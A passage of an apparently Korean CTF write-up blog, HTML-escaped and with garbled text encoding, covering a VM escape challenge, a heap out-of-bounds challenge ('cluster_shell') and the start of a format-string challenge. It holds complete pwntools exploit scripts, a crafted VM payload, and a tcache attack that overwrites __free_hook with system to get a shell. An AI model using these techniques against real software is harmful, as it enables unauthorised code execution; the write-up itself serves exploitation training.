&lt;/p&gt;&lt;p id=&quot;ae068463-604d-4288-b7d8-4ef61fe2e047&quot; class=&quot;&quot;&gt;ìœ„ ì·¨ì•½ì ìœ¼ë¡œ main return addressë¥¼ leakí•˜ì—¬ libc ì£¼ì†Œë¥¼ ì–»ê³  oneshot gadgetë¥¼ ê³„ì‚°í•˜ì—¬ ë‹¤ì‹œ main return addressë¥¼ ë®ìœ¼ë©´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;2d082537-8c29-4897-ade8-174f5934f802&quot; class=&quot;&quot;&gt;ë§ˆì§€ë§‰ìœ¼ë¡œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” vm codeë¥¼ ì‘ì„±í•´ì•¼í•œë‹¤.&lt;/p&gt;&lt;p id=&quot;615f0c41-6bc3-479f-978e-f3196d408081&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;32e13771-9e80-4e3c-81bd-7fbf63aa3865&quot; class=&quot;&quot;&gt;&lt;strong&gt;pwn.asm&lt;/strong&gt;&lt;/p&gt;&lt;pre id=&quot;a2d6d7dd-f77f-4b4d-83d5-11abb128fc6c&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;.LEAK_DATA
empty 8

.LEAK_WORD_1
MOVE cx, 0
:LABEL_1
COMP cx, 18x
MOVE ax, cx
ADD cx, 1
JNE LABEL_1
RETURN

.LEAK_WORD_2
MOVE cx, 0
:LABEL_2
COMP cx, 19x
MOVE ax, cx
ADD cx, 1
JNE LABEL_2
RETURN

.LEAK_WORD_3
MOVE cx, 0
:LABEL_3
COMP cx, 20x
MOVE ax, cx
ADD cx, 1
JNE LABEL_3
RETURN

.LEAK_WORD_4
MOVE cx, 0
:LABEL_4
COMP cx, 21x
MOVE ax, cx
ADD cx, 1
JNE LABEL_4
RETURN

.MAIN
// leak libc
CALL LEAK_WORD_1
MOVE bx, SECTION#LEAK_DATA
ADD bx, 0
MOVE [bx], ax

CALL LEAK_WORD_2
MOVE bx, SECTION#LEAK_DATA
ADD bx, 2
MOVE [bx], ax

CALL LEAK_WORD_3
MOVE bx, SECTION#LEAK_DATA
ADD bx, 4
MOVE [bx], ax

CALL LEAK_WORD_4
MOVE bx, SECTION#LEAK_DATA
ADD bx, 6
MOVE [bx], ax

// leak
MOVE cx, 8
MOVE bx, SECTION#LEAK_DATA
MOVE ax, 1
SYSCALL

// write SECTION#LEAK_DATA
MOVE ax, 0
SYSCALL


// overwrite
MOVE bx, 0
MOVE ax, SECTION#LEAK_DATA
MOVE dx, [ax]
LSHIFT 18x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 19x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 20x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 21x, dx, bx
RETURN&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;84143b82-2aac-47df-b8d9-551bab5f0f0f&quot; class=&quot;&quot;&gt;pwn.asmì—ì„œ í‘œí˜„ëœ 18x, 19x ë“±ì˜ ë ˆì§€ìŠ¤í„°ëŠ” ì›ë˜ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë ˆì§€ìŠ¤í„°ë¡œ, return addressë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì¡°ì‘ëœ opcodeì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;43d2d7d2-326b-47a3-a154-800f918919ab&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;94f9d612-546c-412c-ac9b-a9dfedfc6a75&quot; class=&quot;&quot;&gt;&lt;strong&gt;exploit poc&lt;/strong&gt;&lt;/p&gt;&lt;pre id=&quot;33143017-4f23-4ba7-b80b-bacbfe3063f7&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;#!/usr/bin/env python3
from pwn import *
import hashlib, secrets, re

r = remote(&amp;quot;localhost&amp;quot;, 12001)
p = r.recvline().strip().decode()
k, v = re.findall(r&amp;#x27;\&amp;quot;[^)]*\&amp;quot;&amp;#x27;, p)
k, v = k[1:-1], v[1:-1]
log.info(&amp;quot;parsed (k, v) = ({}, {})&amp;quot;.format(k, v))

pg = log.progress(&amp;quot;PoW&amp;quot;)
pg.status(&amp;quot;solving ...&amp;quot;)

while True:
    x = secrets.token_hex(5)
    if hashlib.sha256((k + x).encode()).hexdigest()[:5] == v:
        pg.success(&amp;quot;solved [x = {}]&amp;quot;.format(x))
        break

payload = &amp;quot;QlZNAAYSABoALAA+AFAAYgAFAAAAAAAAAAABAgAAGQISEQACAgIBAAweAA4BAgAAGQITEQACAgIBAAwwAA4BAgAAGQIUEQACAgIBAAxCAA4BAgAAGQIVEQACAgIBAAxUAA4NGgBBAQACAQAAMQEADSwAQQEAAgECADEBAA0+AEEBAAIBBAAxAQANUABBAQACAQYAMQEAAQIIAEEBAAEAAQAPAQAAAA8BAQAAQQAAIQMABxIDAQIAAgAhAwAHEwMBAgACACEDAAcUAwECAAIAIQMABxUDAQ4=&amp;quot;
# payload = b64e(open(&amp;quot;pwn.bvm&amp;quot;, &amp;quot;rb&amp;quot;).read()
r.sendlineafter(&amp;quot;x = &amp;quot;, x)
r.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, payload)

r.recvuntil(&amp;quot;loading ...\n&amp;quot;)
libc = u64(r.recvn(8)) - 0x021b97 # libc_base
r.info(&amp;quot;libc: {:x}&amp;quot;.format(libc))
r.send(p64(libc + 0x4f365)) # oneshot
r.interactive()

# cat flag
# bob{B0undary_cheCK_1s_e2sy_T0_f0rg2t}&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;175f865e-234c-4491-bc22-9296f3c1e2b6&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;c4a067f0-9fd9-4412-ac59-15f4e6eb9bdd&quot; class=&quot;&quot;&gt;cluster_shell&lt;/h2&gt;&lt;hr id=&quot;b01f7733-4278-4993-a130-c2e9bd202896&quot;/&gt;&lt;figure id=&quot;3384d566-cb20-4ad6-84f5-f8c05116b9e7&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob966.png&quot;&gt;&lt;img style=&quot;width:1197px&quot; src=&quot;/assets/bob/bob966.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;46a5a776-6c3e-4718-8cce-827fd79c16f4&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;libc 2.31 heap oobë¬¸ì œ&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;268f52f2-ff0d-40d7-9bed-66d5c10bc2f6&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;vimì²˜ëŸ¼ ë§Œë“  ë©”ëª¨ì¥ ê¸°ëŠ¥ê³¼ ìœ ì‚¬ ì‰˜ í”„ë¡¬í”„íŠ¸&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;1d299947-80fd-4735-89b1-14fe98ab0551&quot; class=&quot;code&quot;&gt;&lt;code&gt;sh# help
========================================
help    - Help
ls      - List of files
cat     - Print the contents
rm      - Remove file
vim     - Text editor
========================================
sh# ls
 - 1
sh# cat 1

 aaaa

sh# vim 1
##################
#_aaaa...........#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
##################&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;fa4ee743-2714-4392-ac1a-69bfbeaa50b9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;vimìœ¼ë¡œ íŒŒì¼ì„ í•˜ë‚˜ ë§Œë“¤ë•Œ ë§ˆë‹¤ í™ì— 0x110í¬ê¸°ì˜ ì²­í¬ë¥¼ í• ë‹¹í•œë‹¤. &lt;strong&gt;rm&lt;/strong&gt;ìœ¼ë¡œ ì‚­ì œí• ë•Œ ë§ˆë‹¤ freeë¡œ ì²­í¬ í•´ì œ ê°€ëŠ¥. ë”± ë´ë„ ë©”ëª¨ë¦¬ì— ë­”ê°€ ì“°ê±°ë‚˜ í•  ìˆ˜ ìˆëŠ”ê²Œ &lt;strong&gt;vim&lt;/strong&gt;ê¸°ëŠ¥ë°–ì— ì—†ê¸° ë•Œë¬¸ì— vimì½”ë“œë¡œ ê°„ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;12ba6e80-264c-4687-9af3-72adbc565a49&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;sub_1980ê°€ &lt;strong&gt;vim&lt;/strong&gt;ì½”ë“œì´ê³ , ì•ˆì˜ ë¶„ê¸°ì— sub_14E2ê°€ &lt;strong&gt;vim&lt;/strong&gt;ëª¨ë“œì—ì„œ ì»¤ì„œë¥¼ ì›€ì§ì´ëŠ” ì½”ë“œ. switchë¬¸ìœ¼ë¡œ jmpë¡œ í•´ë‹¹ ë£¨í‹´ìœ¼ë¡œ ë“¤ì–´ê°„ë‹¤. sub_149Eê°€ oobë°©ì§€ë¥¼ ìœ„í•œ boundary checkí•¨ìˆ˜&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;1cf3fbf3-ba20-4813-98a1-da7ab241485f&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob967.png&quot;&gt;&lt;img style=&quot;width:1284px&quot; src=&quot;/assets/bob/bob967.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;9a5780e3-8b25-42a4-8972-9a426d989d23&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;qword_5058ì´ vimëª¨ë“œì—ì„œ ì»¤ì„œì˜ ìœ„ì¹˜ì´ë‹¤. ì»¤ì„œì˜ ìœ„ì¹˜ê°€ ì›€ì§ì´ëŠ” ì½”ë“œì—ëŠ” ëª¨ë‘ ìœ„ boundary checkí•¨ìˆ˜ê°€ ìˆì–´ì•¼ í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;28b42b72-241d-4d9e-98e0-7a66fcd54c89&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob968.png&quot;&gt;&lt;img style=&quot;width:718px&quot; src=&quot;/assets/bob/bob968.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;024a64ae-38b3-4544-b3f1-5300aeb2316b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ì§€ë§Œ ê°™ì€ ì˜ì—­ë‚´ì— boundary checkí•¨ìˆ˜ ì—†ì´ ì»¤ì„œì˜ ìœ„ì¹˜ë¥¼ ì¡°ì‘í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤. ì´ë¥¼ ì´ìš©í•´ vim noteë‚´ì—ì„œ oobì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•˜ì—¬ í™ ì˜ì—­ë‚´ì— ì²­í¬ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;0fb32703-28ee-40f4-9357-e84dcf18a0a1&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;switchë¬¸ì„ ë¶„ì„í•˜ë©´ jmpì½”ë“œë¥¼ ì–´ë””ë¡œ íƒˆì§€ í…Œì´ë¸”ì´ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;afa02dbf-3eee-4a2c-85a3-5628807d5340&quot; class=&quot;code&quot;&gt;&lt;code&gt;0x800153c:   lea    0x1ac5(%rip),%rdx        # 0x8003008
=&amp;gt; 0x8001543:   add    %rdx,%rax
   0x8001546:   notrack jmpq *%rax&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;70cb4eee-c75c-4cb1-b79b-9bcd63a4dbc7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;0x8003008 &lt;/code&gt;+ [í…Œì´ë¸” ë°ì´í„°]ë¡œ ì í”„ë¥¼ íƒ€ëŠ”ë° ì í”„ë¥¼ íƒˆ ê³³ì„ ìœ„ì—ì„œ ì°¾ì€ ì·¨ì•½í•œ í•¨ìˆ˜ê°€ ìˆëŠ”ê³³ì„ ì°¾ëŠ”ë‹¤. ì°¾ëŠ” ê°’ì€ 0x8003008 + X = 0x8001608ì´ë¯€ë¡œ &lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;b35700c8-85ac-427a-8f88-075a470c18f2&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(0x8001608-0x8003008&amp;amp;0xffffffff)
&amp;#x27;0xffffe600&amp;#x27;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;786866bd-d50f-4f75-a077-0b7adf327679&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ ê°’ì€ 0x8003008[0x27]ë²ˆì§¸ì— ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;12dd0142-301d-4429-9b11-ec56d1aa5ff8&quot; class=&quot;code&quot;&gt;&lt;code&gt;(gdb) x/128wx 0x8003008
0x8003008:      0xffffe640      0xffffe64e      0xffffe64e      0xffffe64e
0x8003018:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003028:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003038:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003048:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003058:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003068:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003078:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003088:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003098:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe600
0x80030a8:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x80030b8:      0xffffe64e      0xffffe64e      0xffffe541      0xffffe5f2
0x80030c8:      0xffffe56f      0xffffe59d      0xffffe5cb      0xffffe64e
0x80030d8:      0xffffe64e      0xffffe620      0x6f4e0020      0x6c696620
(gdb) x/wx 0x8003008+0x27*4
0x80030a4:      0xffffe600&lt;/code&gt;&lt;/pre&gt;&lt;pre id=&quot;0174c620-9b4f-4db6-834c-200613231369&quot; class=&quot;code&quot;&gt;&lt;code&gt;.text:0000000000001513                 movzx   eax, byte ptr [rbp-9]
.text:0000000000001517                 movsx   eax, al
.text:000000000000151A                 sub     eax, 3Ah ; &amp;#x27;:&amp;#x27;
.text:000000000000151D                 cmp     eax, 35h ; &amp;#x27;5&amp;#x27;
.text:0000000000001520                 ja      loc_1656
.text:0000000000001526                 mov     eax, eax&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;17188f40-0a5d-4f06-9cdd-88f52336d76d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;switchê³„ì‚°ì—ì„œ [ì‚¬ìš©ìì˜ ì…ë ¥] - 0x3aë¥¼ í•˜ë‹ˆ ë”í•˜ë©´ ë¬¸ì &lt;code&gt;a&lt;/code&gt;ê°€ ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;5e26b160-6808-44ca-9b03-66c5ed232368&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x27+0x3a)
&amp;#x27;a&amp;#x27;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;5001c764-b830-480b-8f3c-3b896c4a38af&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;vimëª¨ë“œì—ì„œ aë¬¸ìë¥¼ ì…ë ¥í•  ì‹œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œì˜ ì‹¤í–‰ì„ ì•Œê²Œ ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;ff75e39c-93fa-42de-bb47-a682135b1fa7&quot; class=&quot;code&quot;&gt;&lt;code&gt;mov     rax, cs:qword_5058
add     rax, 1
mov     cs:qword_5058, rax
mov     eax, 0ABCD0001h
mov     cs:qword_5010, rax
jmp     short loc_1663&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;ba232c9d-1671-40cf-a322-552fa302ecff&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ ë’¤ë¶€í„°ëŠ” oobë¥¼ ì´ìš©í•´ ì½”ë“œë¥¼ ë³¼ í•„ìš” ì—†ì´ ë©”ëª¨ë¦¬ë§Œ ë³´ë©´ì„œ ì·¨ì•½ì ì˜ íŠ¸ë¦¬ê±°ê°€ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;0a8ac1f1-e1b2-48d1-b8a4-38c58987aafe&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‹¤ì–‘í•œ ë°©ë²•ìœ¼ë¡œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•  ìˆ˜ ìˆì§€ë§Œ ë‚˜ëŠ” tcache bin attackìœ¼ë¡œ &lt;code&gt;__free_hook&lt;/code&gt;ì— &lt;code&gt;system&lt;/code&gt;ì„ ë®ì–´ì„œ íŠ¸ë¦¬ê±°í•˜ì˜€ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;c4780ac6-195c-4ac8-b9a2-f7be6c6eed9c&quot; class=&quot;code&quot;&gt;&lt;code&gt;alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(5)

oob(0, p64(0x0) + p64(0x481))
free(1)
alloc(1)&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;14d712ca-77e3-45de-91e0-7853e05ac5db&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;heap chunk 6ê°œ í• ë‹¹í•˜ê³  1ë²ˆ í™ì˜ í¬ê¸°ë¥¼ 0x480ìœ¼ë¡œ ë°”ê¿” unsorted binìœ¼ë¡œ ë°”ê¾¸ê³  í•´ì œí•˜ì—¬ libcì˜ ì£¼ì†Œë¥¼ ë°”ë¡œ êµ¬í•  ìˆ˜ ìˆë‹¤. &lt;code&gt;oob&lt;/code&gt;ëŠ” 0ë²ˆì§¸ í™ ì²­í¬ì˜ ë°”ë¡œ ë’¤ì— ì ê¸° ì‹œì‘í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;4d751d33-b462-4234-914e-7eecce46b9a2&quot; class=&quot;code&quot;&gt;&lt;code&gt;free(4)
free(3)

payload = p64(0x0) + p64(0x121)
payload += b&amp;quot;A&amp;quot; * 0x110
payload += p64(0x0) + p64(0x361)
payload += p64(leak)
payload += p64(leak)
payload += b&amp;quot;A&amp;quot; * (0x110-0x10)
payload += p64(0x0) + p64(0x121)
payload += p64(libc + e.symbols[&amp;#x27;__free_hook&amp;#x27;]-0x10)
oob(0, payload)&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;6381a658-ba03-498d-bfdf-2a02fa64ba41&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;4ë²ˆ 3ë²ˆ ì²­í¬ë¥¼ í•´ì œí•´ tcache binì„ ë§Œë“¤ê³  ìœ„ì—ì„œ leakí•œ libcì˜ ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ oobì·¨ì•½ì ìœ¼ë¡œ tcache binì˜ ë‹¤ìŒ í• ë‹¹ë  ê³µê°„ì„ ë°”ê¾¼ë‹¤. tcache binì€ ì‚¬ì´ì¦ˆ ì²´í¬ê°™ì€ ê·€ì°®ì€ê²Œ ì—†ì–´ì„œ í¸í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;9a3bed85-09fb-4a16-98cf-8797fe8c23d1&quot; class=&quot;code&quot;&gt;&lt;code&gt;alloc(&amp;#x27;AA&amp;#x27;)
p.sendlineafter(&amp;quot;sh# &amp;quot;, f&amp;quot;vim /bin/sh&amp;quot;)
p.recvuntil(&amp;quot;#&amp;quot; * 0x10)
p.sendline(b&amp;quot;i&amp;quot; + p64(libc + e.symbols[&amp;#x27;system&amp;#x27;]))
p.recvuntil(&amp;quot;#&amp;quot; * 0x10)
p.sendline(&amp;quot;:q&amp;quot;)
free(&amp;#x27;/bin/sh&amp;#x27;)&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;79370a41-ee37-46b7-98fd-22fac7b15c4a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;__free_hook&lt;/code&gt;ì„ &lt;code&gt;system&lt;/code&gt;ìœ¼ë¡œ ë®ê³  í˜¸ì¶œ.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;39d55a85-9e25-4157-b9a8-71933bc15791&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;15cf535e-4d94-42ad-bcbc-16797253edff&quot; class=&quot;&quot;&gt;exploit&lt;/h3&gt;&lt;pre id=&quot;6bbc7b6d-26d4-4394-9691-e746f980c5d3&quot; class=&quot;code&quot;&gt;&lt;code&gt;#!/usr/bin/env python3

&amp;#x27;&amp;#x27;&amp;#x27;
cluster_shell

in honestly, this is not has a relationship the clustering.

nc pwn.wwwlk.kr 13337

libc: http://pwn.wwwlk.kr/libc.so.6
md5: 10fdeb77eea525914332769e9cd912ae

binary: http://pwn.wwwlk.kr/cluster_shell
md5: a5960d98860dc3d5bf82ba82b0fe6dca
&amp;#x27;&amp;#x27;&amp;#x27;

from pwn import *

# context.log_level = &amp;#x27;debug&amp;#x27;

def alloc(n):
   p.sendlineafter(&amp;quot;sh# &amp;quot;, f&amp;quot;vim {n}&amp;quot;)
   p.recvuntil(&amp;quot;#&amp;quot; * 0x10)
   p.recvuntil(&amp;quot;#&amp;quot; * 0x10)
   p.sendline(&amp;quot;:q&amp;quot;)

def free(n):
   p.sendlineafter(&amp;quot;sh# &amp;quot;, f&amp;quot;rm {n}&amp;quot;)

def oob(n, value):
   p.sendlineafter(&amp;quot;sh# &amp;quot;, f&amp;quot;vim {n}&amp;quot;)
   p.sendline(b&amp;quot;j&amp;quot; * 0xf + b&amp;quot;l&amp;quot; * 0xf + b&amp;#x27;a&amp;#x27; + value)
   p.sendline(&amp;quot;:q&amp;quot;)

gdbscript = &amp;#x27;&amp;#x27;&amp;#x27;
codebase
c
&amp;#x27;&amp;#x27;&amp;#x27;

p = process(&amp;quot;./a.out&amp;quot;)
e = ELF(&amp;quot;./libc.so.6&amp;quot;)

alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(5)

oob(0, p64(0x0) + p64(0x481))
free(1)
alloc(1)

p.sendlineafter(&amp;quot;sh# &amp;quot;, &amp;quot;ls&amp;quot;)
p.recvuntil(&amp;quot; - &amp;quot;)
p.recvuntil(&amp;quot; - &amp;quot;)
p.recvuntil(&amp;quot; - &amp;quot;)
leak = u64(p.recvline().strip().ljust(8, b&amp;#x27;\x00&amp;#x27;))
libc = leak - 0x1ebbe0
log.info(f&amp;quot;leak: 0x{leak:x}&amp;quot;)

free(4)
free(3)

payload = p64(0x0) + p64(0x121)
payload += b&amp;quot;A&amp;quot; * 0x110
payload += p64(0x0) + p64(0x361)
payload += p64(leak)
payload += p64(leak)
payload += b&amp;quot;A&amp;quot; * (0x110-0x10)
payload += p64(0x0) + p64(0x121)
payload += p64(libc + e.symbols[&amp;#x27;__free_hook&amp;#x27;]-0x10)
oob(0, payload)

alloc(&amp;#x27;AA&amp;#x27;)
p.sendlineafter(&amp;quot;sh# &amp;quot;, f&amp;quot;vim /bin/sh&amp;quot;)
p.recvuntil(&amp;quot;#&amp;quot; * 0x10)
p.sendline(b&amp;quot;i&amp;quot; + p64(libc + e.symbols[&amp;#x27;system&amp;#x27;]))
p.recvuntil(&amp;quot;#&amp;quot; * 0x10)
p.sendline(&amp;quot;:q&amp;quot;)
free(&amp;#x27;/bin/sh&amp;#x27;)

p.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;02935868-0961-45a1-b15e-1842d669f01d&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;05725414-0b62-484a-9bb5-7fecd7c05c17&quot; class=&quot;&quot;&gt;Porn Master&lt;/h2&gt;&lt;hr id=&quot;43ee107b-f904-4e22-88b3-a41b62d793f5&quot;/&gt;&lt;figure id=&quot;cef5d68c-6308-47b6-ab23-293c58fca1c0&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob969.png&quot;&gt;&lt;img style=&quot;width:711px&quot; src=&quot;/assets/bob/bob969.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;415c2f77-03b9-4e20-8f54-0c1c046b714f&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Format String Bugë¥¼ ì´ìš©í•œ stack ì˜ì—­ ë³€ì¡° ë° ì‰˜ íšë“ (glibc 2.27)&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;091827e8-a739-42b6-a249-1056523da8ee&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë³´í˜¸ê¸°ë²•&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;7ef78cd9-89a3-411a-9dbd-91c883184a81&quot; class=&quot;code&quot;&gt;&lt;code&gt;Canary                        : âœ“
NX                            : âœ“
PIE                           : âœ“
Fortify                       : âœ˜
RelRO                         : Full&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;d069b597-7255-4883-b9fb-88ba2e4b1af8&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì‹¤í–‰ê²°ê³¼&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;bf907ee9-1171-4d8b-a2fd-cb7499c76a9c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob970.png&quot;&gt;&lt;img style=&quot;width:480px&quot; src=&quot;/assets/bob/bob970.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;4d076f7e-878e-4c37-8408-43f3ba9ef417&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì½”ë“œí™•ì¸&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;65e6aecf-9fdc-471b-9568-55fd5c2ca6c9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì‚¬ìš©ìì—ê²Œ name ì„ 0x64 ì‚¬ì´ì¦ˆë§Œí¼ ì…ë ¥ì„ ë°›ìœ¼ë©° í™ ì˜ì—­ì— ì €ì¥ì„ í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;a95c75ca-7150-49f2-a78c-b0a3d5f69e88&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë˜í•œ, ì‚¬ìš©ìì—ê²Œ 0x18 ì‚¬ì´ì¦ˆë§Œí¼ ì…ë ¥ì„ ë°›ì•„ ìŠ¤íƒì— ì €ì¥í•˜ë©°, ì…ë ¥ê³¼ ì¶œë ¥ì„ ê° 2ë²ˆì”© ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ì˜ì—­ì—ì„œ &lt;code&gt;FSB&lt;/code&gt; ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;563063b7-0a2b-45a8-89b3-d741e4e97222&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob971.png&quot;&gt;&lt;img style=&quot;width:384px&quot; src=&quot;/assets/bob/bob971.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;f926d7d7-5a7a-4a11-a1d7-979eae13d8f8&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” &lt;code&gt;printf&lt;/code&gt; ì— ë¸Œë ˆì´í¬í¬ì¸íŠ¸ ì§€ì • í›„ ë””ë²„ê±° í™•ì¸&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;373d0731-a36f-4319-a7c8-507b53ba29c9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë””ë²„ê±°ë¥¼ í†µí•´ ìŠ¤íƒì„ í™•ì¸í•  ì‹œ &lt;code&gt;0x00007ffd8e961198&lt;/code&gt; ì£¼ì†Œê°€ &lt;code&gt;0x00007ffd8e96118c&lt;/code&gt; (ë³€ìˆ˜ i)ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° ë³€ìˆ˜(idx)ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì¦‰, í•´ë‹¹ì˜ì—­ì„ FSBë¥¼ í†µí•´ ë³€ì¡°í•  ì‹œ ë¬´ì œí•œìœ¼ë¡œ ì…ì¶œë ¥ í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul 